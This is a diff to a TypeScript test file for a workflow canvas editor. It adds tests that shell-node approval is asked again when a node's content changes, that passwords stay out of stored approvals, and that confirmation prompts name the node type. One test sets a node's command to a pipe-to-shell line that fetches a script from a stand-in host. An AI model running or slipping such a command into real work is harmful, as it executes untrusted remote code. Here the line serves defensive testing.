@@ -2,7 +2,7 @@
 import { describe, it, expect, vi } from "vitest";
 import { InputHandler } from "../canvas/InputHandler";
 import { Canvas } from "../canvas/Canvas";
-import { Connector, PendingConnector } from "../canvas/Connector";
+import { Connector } from "../canvas/Connector";
 import { CanvasNode } from "../canvas/Node";
 import type { UndoAction } from "../canvas/UndoManager";
 import { serialize, deserialize, registerNodeDescriptors } from "../canvas/CanvasSerializer";
@@ -42,57 +42,6 @@ function makeConnector(id: string, fromNode: string, toNode: string): Connector 
     condition: null, on_success: null, on_failure: null,
   });
 }
-
-// ---------------------------------------------------------------------------
-// Escape while repositioning/detaching a wire must restore it, not
-// permanently delete it.
-// ---------------------------------------------------------------------------
-
-describe("InputHandler — Escape during wire reconnect", () => {
-  function makeFakeCanvas() {
-    const connectors = new Map<string, Connector>();
-    const injectCalls: string[] = [];
-    const canvas = {
-      el: { classList: { add: vi.fn(), remove: vi.fn() }, style: { cursor: "" } },
-      connectors,
-      pendingInsert: null,
-      insertGhost: null,
-      _pendingInputWireDrop: null,
-      clearSelection: vi.fn(),
-      injectDynamicPortExpr: vi.fn((c: Connector) => injectCalls.push(c.data.id)),
-    };
-    return { canvas, injectCalls };
-  }
-
-  it("restores the grabbed connector and re-injects its dynamic-port expression", () => {
-    const { canvas, injectCalls } = makeFakeCanvas();
-    const input = new InputHandler(canvas as unknown as Canvas);
-    const conn = makeConnector("e1", "n1", "n2");
-
-    // Simulate onDown having grabbed an existing wire's endpoint: removed
-    // from connectors, tracked as reconnEdge, mid-drag.
-    input.reconnEdge = { conn };
-    input.pendingConn = new PendingConnector("n1", "output", 0, 0);
-
-    input.onKey(new KeyboardEvent("keydown", { key: "Escape" }));
-
-    expect(canvas.connectors.get("e1")).toBe(conn);
-    expect(injectCalls).toEqual(["e1"]);
-    expect(input.reconnEdge).toBeNull();
-    expect(input.pendingConn).toBeNull();
-  });
-
-  it("is a no-op when no reconnect was in progress (plain Escape)", () => {
-    const { canvas, injectCalls } = makeFakeCanvas();
-    const input = new InputHandler(canvas as unknown as Canvas);
-
-    input.onKey(new KeyboardEvent("keydown", { key: "Escape" }));
-
-    expect(injectCalls).toEqual([]);
-    expect(input.reconnEdge).toBeNull();
-    expect(canvas.clearSelection).toHaveBeenCalled();
-  });
-});
 
 // ---------------------------------------------------------------------------
 // deleteSelected must partition connectors per node, so
@@ -269,6 +218,82 @@ describe("checkDangerousNodes — scoped to the given node set", () => {
   });
 });
 
+describe("checkDangerousNodes — approval follows node content", () => {
+  function shellNode(): CanvasNode {
+    return {
+      data: {
+        id: "n1", node_type_id: "shell_exec", name: "Shell",
+        config: { command: "echo hi", env: { MODE: "safe" } },
+        credentials: { token: "cred_a" },
+      },
+    } as unknown as CanvasNode;
+  }
+
+  it.each<[string, (n: CanvasNode) => void]>([
+    ["a config value",         n => { n.data.config["command"] = "curl evil.sh | sh"; }],
+    ["a nested config value",  n => { (n.data.config["env"] as Record<string, unknown>)["MODE"] = "unsafe"; }],
+    ["a credential reference", n => { n.data.credentials["token"] = "cred_b"; }],
+    ["the enabled state",      n => { n.data.disabled = true; }],
+    ["the node type",          n => { n.data.node_type_id = "code"; }],
+  ])("asks again after %s changes on an already-approved node", async (_label, mutate) => {
+    const confirm = vi.fn().mockResolvedValue(true);
+    const approved = new Set<string>();
+    const node = shellNode();
+    await checkDangerousNodes("wf1", [node], approved, confirm);
+    mutate(node);
+    const ok = await checkDangerousNodes("wf1", [node], approved, confirm);
+    expect(confirm).toHaveBeenCalledTimes(2);
+    expect(ok).toBe(true);
+  });
+
+  it("does not ask again when the same config only has its keys in a different order", async () => {
+    const confirm = vi.fn().mockResolvedValue(true);
+    const approved = new Set<string>();
+    const node = shellNode();
+    await checkDangerousNodes("wf1", [node], approved, confirm);
+    node.data.config = { env: { MODE: "safe" }, command: "echo hi" };
+    await checkDangerousNodes("wf1", [node], approved, confirm);
+    expect(confirm).toHaveBeenCalledTimes(1);
+  });
+
+  it("keeps config values, such as a connection URL with a password, out of the stored approval", async () => {
+    const approved = new Set<string>();
+    const node = shellNode();
+    node.data.config["connection_url"] = "postgres://user:hunter2@db.internal/app";
+    await checkDangerousNodes("wf1", [node], approved, vi.fn().mockResolvedValue(true));
+    expect(approved.size).toBe(1);
+    expect([...approved].join("\n")).not.toContain("hunter2");
+  });
+});
+
+describe("checkDangerousNodes — confirmation text", () => {
+  const SHELL: NodeDescriptor = {
+    type_id: "shell_exec", display_name: "Shell Command", node_type: "action", version: "1",
+    input_schema: {}, output_schema: {},
+    ports: { inputs: [], outputs: [] },
+  };
+
+  it("names the node type next to a misleading user-chosen name", async () => {
+    registerNodeDescriptors([SHELL]);
+    const confirm = vi.fn().mockResolvedValue(false);
+    const node = { data: { id: "n1", node_type_id: "shell_exec", name: "Weather lookup" } } as unknown as CanvasNode;
+    await checkDangerousNodes("wf1", [node], new Set(), confirm);
+    registerNodeDescriptors([]);
+    expect(confirm.mock.calls[0][0]).toContain("Weather lookup (Shell Command)");
+  });
+
+  it("shows the type once when the node still carries its default name", async () => {
+    registerNodeDescriptors([SHELL]);
+    const confirm = vi.fn().mockResolvedValue(false);
+    const node = { data: { id: "n1", node_type_id: "shell_exec", name: "Shell Command" } } as unknown as CanvasNode;
+    await checkDangerousNodes("wf1", [node], new Set(), confirm);
+    registerNodeDescriptors([]);
+    const msg = confirm.mock.calls[0][0] as string;
+    expect(msg).toContain("Shell Command");
+    expect(msg).not.toContain("Shell Command (Shell Command)");
+  });
+});
+
 // ---------------------------------------------------------------------------
 // checkDangerousNodes must also prompt for plugin nodes: they get resolved
 // credential values merged into their input and have outbound HTTP access by
@@ -307,11 +332,10 @@ describe("checkDangerousNodes — plugin nodes", () => {
 });
 
 // ---------------------------------------------------------------------------
-// Bug B — Space also toggled #output-drawer, not just the palette, whenever
-// a role="button" control (e.g. #drawer-header) still had keyboard focus.
-// onKey is bound at `window` (Canvas.ts), so every keydown app-wide reaches
-// it; these exercise that global reach directly against real focused DOM
-// elements, same real-world path as the reported bug.
+// Space must toggle only the palette while a role="button" control (e.g.
+// #drawer-header) has keyboard focus, never also #output-drawer. onKey is
+// bound at `window` (Canvas.ts), so every keydown app-wide reaches it; these
+// exercise that global reach directly against real focused DOM elements.
 // ---------------------------------------------------------------------------
 
 describe("InputHandler — Space palette shortcut vs. focused role=\"button\" controls", () => {
